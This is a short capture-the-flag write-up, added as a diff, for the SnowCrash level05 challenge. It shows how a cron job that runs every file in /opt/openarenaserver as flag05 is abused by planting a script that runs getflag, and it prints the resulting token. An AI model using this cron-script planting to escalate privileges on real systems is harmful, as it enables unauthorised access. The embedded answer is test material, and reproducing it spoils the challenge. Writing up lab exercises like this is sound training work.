@@ -1,0 +1,49 @@
+As soon as we long in, we receive a notification, which says that we received an email 
+
+So, cat /var/mail/level05
+
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+syntax of the crontab.
+We suppose that the flag05 user has a crontab that run this script due to the mail.
+
+
+level05@SnowCrash:~$ sh /usr/sbin/openarenaserver 
+bash: /opt/openarenaserver/*: No such file or directory
+
+
+level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver 
+-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
+
+This file has extended permission ACLs
+so : 
+
+level05@SnowCrash:~$ getfacl /usr/sbin/openarenaserver 
+getfacl: Removing leading '/' from absolute path names
+# file: usr/sbin/openarenaserver
+# owner: flag05
+# group: flag05
+user::rwx
+user:level05:r--
+group::r-x
+mask::r-x
+other::---
+
+We can read it with the user level05 
+
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+This script execute all the scripts in the directory openaremaserver and deletes them afterwards. 
+
+We can add a script that execute the getflag command in this directory and save it in a file somewhere. This script will be executed by the flag05 user.
+
+level05@SnowCrash:~$ echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag
+level05@SnowCrash:~$ tail /tmp/flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
